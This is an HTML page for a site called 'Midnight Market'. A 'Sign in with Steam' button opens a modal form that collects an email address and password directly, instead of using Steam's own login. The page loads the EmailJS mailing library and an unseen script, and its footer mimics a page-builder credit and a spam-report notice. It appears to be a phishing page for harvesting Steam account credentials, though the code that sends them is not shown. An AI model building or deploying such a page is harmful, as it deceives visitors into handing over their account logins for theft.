<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Home</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="/home.css" />
  </head>
  <body>
    <header class="container">
      <div class="py-4">
        <h2 class="head_title">MIDNIGHT MARKET</h2>
        <button
          class="top_button"
          data-bs-toggle="modal"
          data-bs-target="#exampleModal"
          data-bs-whatever="@mdo"
          type="button"
        >
          <span>SIGN IN WITH STEAM</span>
        </button>

        <div
          class="modal fade"
          id="exampleModal"
          tabindex="-1"
          aria-labelledby="exampleModalLabel"
          aria-hidden="true"
        >
          <div class="modal-dialog">
            <div class="modal-content">
              <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLabel">New message</h5>
                <button
                  type="button"
                  class="btn-close"
                  data-bs-dismiss="modal"
                  aria-label="Close"
                ></button>
              </div>
              <div class="modal-body">
                <form id="contact" method="post">
                  <h3 class="text-center">SignIn Form</h3>
                  <fieldset>
                    <label for="email">Email:</label>
                    <input
                      placeholder="Your Email Address"
                      type="email"
                      name="email"
                      tabindex="1"
                      required
                      autofocus
                      class="email"
                    />
                  </fieldset>
                  <fieldset>
                    <label for="password"> Password: </label>
                    <input
                      placeholder="Your password"
                      type="password"
                      tabindex="2"
                      required
                      class="password"
                    />
                  </fieldset>
                  <fieldset>
                    <button
                      name="submit"
                      type="submit"
                      id="contact-submit"
                      data-submit="...Sending"
                      data-bs-dismiss="modal"
                      class="submit"
                    >
                      Submit
                    </button>
                  </fieldset>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </header>
    <main class="container">
      <div class="position-relative w-100 h-100">
        <img class="w-100 h-100" src="assets/mainImage.png" alt="main Image" />
      </div>
    </main>
    <footer class="position-fixed bottom-0 bg-black w-100 text-white">
      <div
        class="
          d-flex
          flex-sm-column flex-lg-row flex-column
          justify-content-between
          align-items-center
          px-2
          container
        "
      >
        <p class="">
          The site was built with
          <a class="text-white" href="/">GrooveFunnels</a>
        </p>
        <p class="">
          If this site is <sup>spam</sup> or <sup>abuse, report here.</sup>
        </p>
      </div>
    </footer>
    <!-- bootstrap js file -->
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
      crossorigin="anonymous"
    ></script>
    <!-- sweet alert file -->
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@10"></script>
    <!-- emailjs file -->
    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"
    ></script>
    <!-- main js file -->
    <script src="/home.js"></script>
  </body>
</html>
